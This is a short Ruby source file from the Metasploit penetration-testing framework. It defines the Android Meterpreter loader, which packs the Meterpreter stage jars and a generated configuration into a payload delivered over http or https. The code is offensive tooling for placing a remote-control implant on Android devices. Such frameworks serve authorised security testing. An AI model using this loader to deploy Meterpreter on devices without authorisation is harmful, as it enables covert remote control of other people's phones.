# -*- coding: binary -*-

require 'msf/core'
require 'msf/base/sessions/meterpreter_options'
require 'msf/core/payload/uuid/options'

module Msf

###
#
# Common loader for Android payloads that make use of Meterpreter.
#
###

module Payload::Android::MeterpreterLoader

  include Msf::Payload::Android
  include Msf::Payload::UUID::Options
  include Msf::Sessions::MeterpreterOptions

  def initialize(info={})
    super(update_info(info,
      'Name'          => 'Android Meterpreter & Configuration',
      'Description'   => 'Android-specific meterpreter generation',
      'Author'        => ['OJ Reeves'],
      'Platform'      => 'android',
      'Arch'          => ARCH_DALVIK,
      'PayloadCompat' => {'Convention' => 'http https'},
      'Stage'         => {'Payload' => ''}
    ))
  end

  def stage_payload(opts={})
    stage_meterpreter(opts)
  end

  def stage_meterpreter(opts={})
    clazz = 'androidpayload.stage.Meterpreter'
    metstage = MetasploitPayloads.read("android", "metstage.jar")
    met = MetasploitPayloads.read("android", "meterpreter.jar")

    # Name of the class to load from the stage, the actual jar to load
    # it from, and then finally the meterpreter stage
    blocks = [
      java_string(clazz),
      java_string(metstage),
      java_string(met),
      java_string(generate_config(opts))
    ]

    (blocks + [blocks.length]).pack('A*' * blocks.length + 'N')
  end

end
end

